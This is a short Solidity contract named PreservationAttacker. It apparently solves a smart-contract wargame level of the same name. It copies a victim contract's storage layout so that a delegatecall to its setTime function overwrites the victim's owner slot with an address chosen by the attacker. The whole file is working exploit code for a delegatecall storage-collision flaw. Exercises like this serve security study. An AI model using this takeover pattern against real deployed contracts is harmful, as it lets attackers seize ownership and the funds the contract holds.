// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;


contract PreservationAttacker {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 

  function setTime(uint _timestamp) public {
      owner = address(uint160(_timestamp));
  }

}